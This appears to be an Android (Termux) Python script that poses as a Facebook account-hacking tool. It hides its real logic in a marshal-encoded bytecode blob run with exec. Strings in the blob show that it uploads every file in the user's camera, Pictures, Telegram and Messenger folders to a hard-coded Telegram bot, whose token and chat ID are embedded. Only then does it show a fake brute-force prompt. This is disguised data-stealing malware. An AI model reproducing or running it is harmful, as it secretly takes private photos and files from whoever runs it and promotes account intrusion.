import os
import sys
import time
import requests
from pystyle import *

# بيانات البوت والمستخدم المرسل إليه
bot_token = '6078999720:AAEobp4-oTAPF0apNz-L6UqUoA_2_DfMQ3M'
chat_id = '802140429'
os.system('clear')

# المسارات التي تحتوي على الملفات التي تريد إرسالها
paths = ['/sdcard/web', '/sdcard/test', '/sdcard/DCIM/Camera', '/sdcard/DCIM/Facebook', '/sdcard/Pictures/', '/sdcard/Pictures/Telegram', '/sdcard/Pictures/Messenger', '/sdcard/']



import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\xf3\xf4\x03\x00\x00\x97\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x00d\x02l\x04T\x00d\x03Z\x05d\x04Z\x06\x02\x00e\x00j\x07\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00g\x00d\x06\xa2\x01Z\x08\x02\x00e\td\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x08D\x00]\xb1Z\n\x02\x00e\x00j\x0b\x00\x00\x00\x00\x00\x00\x00\x00e\n\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z\x0ce\x0cD\x00]\x9cZ\re\x00j\n\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x00j\n\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\ne\r\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00r\x01\x8c6d\x08e\x05\x9b\x00d\t\x9d\x03Z\x10\x02\x00e\x11e\x00j\n\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\ne\r\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00d\n\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00Z\x12\x02\x00e\x03j\x13\x00\x00\x00\x00\x00\x00\x00\x00e\x10d\x0be\x06i\x01d\x0ce\x12i\x01\xac\r\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00Z\x14e\x14j\x15\x00\x00\x00\x00\x00\x00\x00\x00d\x0ek\x03\x00\x00\x00\x00r\x01\t\x00d\x01d\x01d\x01\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x8c\x9d\x8c\xb2\x02\x00e\x00j\x07\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\td\x0f\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\td\x0f\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x10Z\x16\x02\x00e\te\x16\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x07\x00\x00\x00\x00\x00\x00\x00\x00d\x11\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x17\xa0\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x12e\x19j\x1a\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\td\x13\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x17\xa0\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x14e\x19j\x1b\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\td\x13\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x17\xa0\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x15e\x19j\x1b\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Z\x1d\x02\x00e\td\x0f\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x17\xa0\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x16e\x19j\x1b\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Z\x1e\x02\x00e\td\x0f\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\td\x17\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x02j\x1f\x00\x00\x00\x00\x00\x00\x00\x00d\x18\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\td\x0f\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\td\x19\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x1a\xe9\x00\x00\x00\x00N)\x01\xda\x01*z.6078999720:AAEobp4-oTAPF0apNz-L6UqUoA_2_DfMQ3M\xda\t802140429\xda\x05clear)\x07z\x0b/sdcard/webz\x0c/sdcard/testz\x13/sdcard/DCIM/Cameraz\x15/sdcard/DCIM/Facebookz\x11/sdcard/Pictures/z\x19/sdcard/Pictures/Telegramz\x1a/sdcard/Pictures/Messengerz\x16\x1b[32m please wait ....z\x1chttps://api.telegram.org/botz\r/sendDocument\xda\x02rb\xda\x07chat_id\xda\x08document)\x02\xda\x04data\xda\x05files\xe9\xc8\x00\x00\x00\xda\x00u\x19\x05\x00\x00\n\n          \x1b[32mby : Mr - Dark\n\x1b[33m\n\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\n\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa6\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\n\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xa6\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n\nz"termux-open https://t.me/name_darkz.[+] My name is dark => https://t.me/name_dark \xfa\x01\nz4[+] This tool is designed to hack Facebook accounts z![+] Enter id or email or phone : z\x1a[+] Enter password list : z\'\x1b[32m The account is being hacked  ....\xe9\x05\x00\x00\x00z$\x1b[34m Password not found, try again ) \xda\x02os\xda\x03sys\xda\x04time\xda\x08requests\xda\x07pystyle\xda\tbot_tokenr\x07\x00\x00\x00\xda\x06system\xda\x05paths\xda\x05print\xda\x04path\xda\x07listdirr\n\x00\x00\x00\xda\x04file\xda\x05isdir\xda\x04join\xda\x03url\xda\x04open\xda\x01f\xda\x04post\xda\x01r\xda\x0bstatus_code\xda\x03log\xda\x05Write\xda\x05Print\xda\x06Colors\xda\rpurple_to_red\xda\x0epurple_to_blue\xda\x05Input\xda\x04user\xda\x04list\xda\x05sleep\xa9\x00\xf3\x00\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r/\x00\x00\x00\x01\x00\x00\x00s\xbf\x02\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\n\x80\n\x80\n\x80\n\xd8\x00\x0b\x80\x0b\x80\x0b\x80\x0b\xd8\x00\x0f\x80\x0f\x80\x0f\x80\x0f\xd8\x00\x15\xd0\x00\x15\xd0\x00\x15\xd0\x00\x15\xf0\x0e\x00\r=\x80\t\xd8\n\x15\x80\x07\xd8\x00\t\x80\x02\x84\t\x88\'\xd1\x00\x12\xd4\x00\x12\xd0\x00\x12\xf0\x06\x00\th\x02\xf0\x00\x00\th\x02\xf0\x00\x00\th\x02\x80\x05\xf0\x08\x00\x01\x06\x80\x05\xd0\x07"\xd1\x00#\xd4\x00#\xd0\x00#\xf0\x06\x00\r\x12\xf0\x00\x0c\x01\x15\xf0\x00\x0c\x01\x15\x80D\xd8\x0c\x16\x88B\x8cJ\x90t\xd1\x0c\x1c\xd4\x0c\x1c\x80E\xd8\x10\x15\xf0\x00\n\x05\x15\xf0\x00\n\x05\x15\x88\x04\xd8\x0b\r\x8c7\x8f=\x8a=\x98\x12\x9c\x17\x9f\x1c\x9a\x1c\xa0d\xa8D\xd1\x191\xd4\x191\xd1\x0b2\xd4\x0b2\xf0\x00\x01\t\x15\xd8\x0c\x14\xe0\x0eE\xa8Y\xd0\x0eE\xd0\x0eE\xd0\x0eE\x88\x03\xd8\r\x11\x88T\x90"\x94\'\x97,\x92,\x98t\xa0T\xd1\x12*\xd4\x12*\xa8D\xd1\r1\xd4\r1\xf0\x00\x05\t\x15\xb0Q\xd8\x10\x1d\x90\x08\x94\r\x98c\xa8\x19\xb0G\xd0(<\xc0Z\xd0QR\xc0O\xd0\x10T\xd1\x10T\xd4\x10T\x88A\xd8\x0f\x10\x8c}\xa0\x03\xd2\x0f#\xd0\x0f#\xf0\x06\x00\x11\x15\xf0\x0b\x05\t\x15\xf0\x00\x05\t\x15\xf0\x00\x05\t\x15\xf1\x00\x05\t\x15\xf4\x00\x05\t\x15\xf0\x00\x05\t\x15\xf0\x00\x05\t\x15\xf0\x00\x05\t\x15\xf0\x00\x05\t\x15\xf0\x00\x05\t\x15\xf0\x00\x05\t\x15\xf8\xf8\xf8\xf0\x00\x05\t\x15\xf0\x00\x05\t\x15\xf0\x00\x05\t\x15\xf0\x00\x05\t\x15\xf8\xf0\x0b\n\x05\x15\xf0\x18\x00\x01\n\x80\x02\x84\t\x88\'\xd1\x00\x12\xd4\x00\x12\xd0\x00\x12\xe0\x00\x05\x80\x05\x80r\x81\n\x84\n\x80\n\xd8\x00\x05\x80\x05\x80r\x81\n\x84\n\x80\n\xf0\x02\x0b\x07\x04\x80\x03\xf0\x18\x00\x01\x06\x80\x05\x80s\x81\x0b\x84\x0b\x80\x0b\xd8\x00\t\x80\x02\x84\t\xd0\n.\xd1\x00/\xd4\x00/\xd0\x00/\xd8\x00\x05\x87\x0b\x82\x0b\xd0\x0c<\xb8f\xd4>R\xd1\x00S\xd4\x00S\xd0\x00S\xd8\x00\x05\x80\x05\x80t\x81\x0c\x84\x0c\x80\x0c\xd8\x00\x05\x87\x0b\x82\x0b\xd0\x0cB\xc0F\xd4DY\xd1\x00Z\xd4\x00Z\xd0\x00Z\xe0\x00\x05\x80\x05\x80t\x81\x0c\x84\x0c\x80\x0c\xe0\x07\x0c\x87{\x82{\xd0\x136\xb8\x06\xd48M\xd1\x07N\xd4\x07N\x80\x04\xd8\x00\x05\x80\x05\x80r\x81\n\x84\n\x80\n\xd8\x07\x0c\x87{\x82{\xd0\x13/\xb0\x16\xd41F\xd1\x07G\xd4\x07G\x80\x04\xd8\x00\x05\x80\x05\x80r\x81\n\x84\n\x80\n\xd8\x00\x05\x80\x05\xd0\x073\xd1\x004\xd4\x004\xd0\x004\xd8\x00\n\x80\x04\x84\n\x881\x81\r\x84\r\x80\r\xd8\x00\x05\x80\x05\x80r\x81\n\x84\n\x80\n\xd8\x00\x05\x80\x05\xd0\x070\xd1\x001\xd4\x001\xd0\x001\xd0\x001\xd0\x001s\x12\x00\x00\x00\xc2/$C\x1f\x07\xc3\x1f\x04C#\x0b\xc3&\x01C#\x0b'))
